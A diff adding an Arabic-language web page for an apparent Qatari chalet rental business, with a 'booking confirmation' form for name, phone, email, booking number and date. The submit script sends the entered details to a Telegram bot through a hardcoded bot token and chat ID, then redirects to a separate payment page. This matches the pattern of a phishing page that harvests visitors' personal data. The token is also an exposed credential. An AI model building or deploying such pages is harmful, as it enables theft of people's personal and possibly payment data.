@@ -1,0 +1,237 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>إستراحة المها لحجز الشاليهات</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css" />
+  <style>
+    :root {
+      --main-color: #f9fafb;
+      --text-color: #111;
+      --header-bg: #f9fafb;
+      --btn-bg: #1e40af;
+      --btn-text: #fff;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --main-color: #111827;
+        --text-color: #f9fafb;
+        --header-bg: #1f2937;
+        --btn-bg: #2563eb;
+        --btn-text: #ffffff;
+      }
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Cairo', sans-serif;
+      background-color: var(--main-color);
+      color: var(--text-color);
+    }
+
+    h1, h2, h3, .logo {
+      font-family: 'Tajawal', sans-serif;
+    }
+
+    .main-header {
+      background-color: var(--header-bg);
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .logo img {
+      max-width: 130px;
+      display: block;
+      margin: 0 auto 10px;
+      border-radius: 10px;
+      background-color: #fff;
+      padding: 8px;
+    }
+
+    .tagline {
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 1100px;
+      margin: auto;
+      padding: 15px;
+    }
+
+    .booking button {
+      background-color: var(--btn-bg);
+      color: var(--btn-text);
+      padding: 12px 24px;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      border-radius: 8px;
+      width: 100%;
+    }
+
+    input, label {
+      display: block;
+      width: 100%;
+      margin-bottom: 15px;
+    }
+
+    input {
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .swiper {
+      margin-top: 20px;
+    }
+
+    .swiper-slide {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .swiper-slide img {
+      width: 100%;
+      height: auto;
+      border-radius: 12px;
+      object-fit: cover;
+      max-height: 300px;
+    }
+
+    footer {
+      background-color: var(--header-bg);
+      color: var(--text-color);
+      padding: 20px 0;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    @media (min-width: 768px) {
+      .swiper-slide img {
+        max-height: 350px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="main-header">
+    <div class="container">
+      <div class="logo">
+        <img src="https://i.imgur.com/VpbMJwa.png" alt="شعار إستراحة المها" />
+      </div>
+      <p class="tagline">راحة وأناقة في قلب قطر</p>
+    </div>
+  </header>
+
+  <main class="container">
+    <section class="about">
+      <h2>من نحن؟</h2>
+      <p>
+        إستراحة المها لتأجير الشاليهات هي وجهتك المثالية لقضاء عطلات فاخرة في أرقى شاليهات قطر.
+        نقدم لك تجربة استثنائية من الراحة والفخامة، شاليهاتنا مجهزة بالكامل وتناسب جميع الأذواق، نوفر لك خدمة الحجز بكل سهولة واحترافية.
+      </p>
+    </section>
+
+    <section class="gallery">
+      <h2>صور من شاليهاتنا</h2>
+      <div class="swiper mySwiper">
+        <div class="swiper-wrapper">
+          <div class="swiper-slide"><img src="https://images.pexels.com/photos/259588/pexels-photo-259588.jpeg" alt="شاليه 1" /></div>
+          <div class="swiper-slide"><img src="https://images.pexels.com/photos/271624/pexels-photo-271624.jpeg" alt="شاليه 2" /></div>
+          <div class="swiper-slide"><img src="https://images.pexels.com/photos/276528/pexels-photo-276528.jpeg" alt="شاليه 3" /></div>
+          <div class="swiper-slide"><img src="https://images.pexels.com/photos/276551/pexels-photo-276551.jpeg" alt="شاليه 4" /></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="booking">
+      <h2>تأكيد الحجز الإلكتروني</h2>
+      <form id="bookingForm">
+        <label for="bookingNumber">رقم الحجز:</label>
+        <input type="text" id="bookingNumber" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+        <label for="fullName">الاسم الكامل:</label>
+        <input type="text" id="fullName" required />
+
+        <label for="phoneNumber">رقم الهاتف:</label>
+        <input type="tel" id="phoneNumber" required />
+
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" required />
+
+        <label for="bookingDate">تاريخ الحجز:</label>
+        <input type="date" id="bookingDate" required />
+
+        <button type="submit">إرسال الحجز</button>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <div class="container">
+      <p><strong>🏡 إستراحة المها | استمتع بإقامتك الخاصة معنا في قلب قطر 🇶🇦</strong></p>
+      <p>✨ خدمة راقية • مواقع مميزة • شاليهات مصممة لراحتك</p>
+      <p style="color: #888;">📞 للاستفسار والتواصل: info@almaha.qa</p>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
+  <script>
+    const swiper = new Swiper(".mySwiper", {
+      loop: true,
+      autoplay: {
+        delay: 2500,
+        disableOnInteraction: false
+      },
+      slidesPerView: 1,
+      spaceBetween: 10,
+      breakpoints: {
+        768: { slidesPerView: 2 },
+        1024: { slidesPerView: 3 }
+      }
+    });
+
+    document.getElementById("bookingForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const token = "7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM";
+      const chatId = "1008144314";
+
+      const bookingNumber = document.getElementById("bookingNumber").value;
+      const fullName = document.getElementById("fullName").value;
+      const phone = document.getElementById("phoneNumber").value;
+      const email = document.getElementById("email").value;
+      const date = document.getElementById("bookingDate").value;
+
+      const message = `🔔 حجز جديد:
+رقم الحجز: ${bookingNumber}
+الاسم: ${fullName}
+الهاتف: ${phone}
+البريد: ${email}
+تاريخ الحجز: ${date}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = 'payment_page.html';
+        } else {
+          alert("فشل في إرسال البيانات، تأكد من الاتصال بالإنترنت.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
